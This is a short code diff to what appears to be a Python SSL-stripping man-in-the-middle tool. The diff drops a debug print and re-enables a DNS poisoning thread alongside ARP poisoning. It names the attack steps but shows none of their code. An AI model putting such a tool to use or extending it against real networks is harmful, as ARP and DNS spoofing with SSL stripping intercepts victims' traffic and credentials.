@@ -60,8 +60,6 @@ class SSLStripRequestHandler(ProxyRequestHandler):
     replaced_urls = deque(maxlen=1024)
     def request_handler(self, req, req_body):
 	print "\n-----------------------------[Request]--------------------------------"
-	if ".home" in req.path:
-		print ".HOME FDP {}".format(req.path)
 	if req.headers:
 		print "[+]Original Headers:"
 		print req.headers
@@ -166,7 +164,7 @@ class SSLKiller(object):
 		self.ArpPoisoner()
 		sys.stdout.write("\n[+] ARP Poisoner thread loaded")
 		#don't no if i continue with dnspoison or only with proxy trickstery
-		#self.DnsPoisoner()
+		self.DnsPoisoner()
 		print "\n[+] DNS Poisoner thread loaded"
 
 	def ArpPoisoner(self):
